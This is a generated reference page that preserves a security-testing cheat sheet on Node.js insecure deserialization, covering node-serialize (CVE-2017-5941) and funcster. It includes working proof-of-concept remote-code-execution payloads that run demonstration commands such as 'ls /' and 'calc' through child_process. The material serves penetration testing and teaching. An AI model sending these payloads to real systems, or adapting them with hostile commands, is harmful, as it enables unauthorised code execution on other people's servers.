---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Node Deserialization

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-insecure-deserialization-node` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Deserialization/Node.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Node Deserialization](../../topics/insecure-deserialization/node-deserialization.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-insecure-deserialization-node |
| name | Node Deserialization |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md |

## Preserved Source Material

````yaml
_body: "# Node Deserialization\n\n> Node.js deserialization refers to the process of reconstructing JavaScript objects from\
  \ a serialized format, such as JSON, BSON, or other formats that represent structured data. In Node.js applications, serialization\
  \ and deserialization are commonly used for data storage, caching, and inter-process communication.\n\n## Summary\n\n* [Methodology](#methodology)\n\
  \    * [node-serialize](#node-serialize)\n    * [funcster](#funcster)\n* [References](#references)\n\n## Methodology\n\n\
  * In Node source code, look for:\n\n    * `node-serialize`\n    * `serialize-to-js`\n    * `funcster`\n\n### node-serialize\n\
  \n> An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the `unserialize()`\
  \ function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked\
  \ Function Expression (IIFE).\n\n1. Generate a serialized payload\n\n    ```js\n    var y = {\n        rce : function(){\n\
  \            require('child_process').exec('ls /', function(error,\n            stdout, stderr) { console.log(stdout) });\n\
  \        },\n    }\n    var serialize = require('node-serialize');\n    console.log(\"Serialized: \\n\" + serialize.serialize(y));\n\
  \    ```\n\n2. Add bracket `()` to force the execution\n\n    ```js\n    {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls\
  \ /', function(error,stdout, stderr) { console.log(stdout) });}()\"}\n    ```\n\n3. Send the payload\n\n### funcster\n\n\
  ```js\n{\"rce\":{\"__js_function\":\"function(){CMD=\\\"cmd /c calc\\\";const process = this.constructor.constructor('return\
  \ this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()\"\
  }}\n```\n\n## References\n\n* [CVE-2017-5941 - National Vulnerability Database - February 9, 2017](https://web.archive.org/web/20190820172715/https://nvd.nist.gov/vuln/detail/CVE-2017-5941)\n\
  * [Exploiting Node.js deserialization bug for Remote Code Execution (CVE-2017-5941) - Ajin Abraham - October 31, 2018](https://web.archive.org/web/20181031111654/https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)\n\
  * [NodeJS Deserialization - gonczor - January 8, 2020](https://web.archive.org/web/20240530025137/https://blacksheephacks.pl/nodejs-deserialization/)"
_relative_path: Insecure Deserialization/Node.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Deserialization/Node.md
````
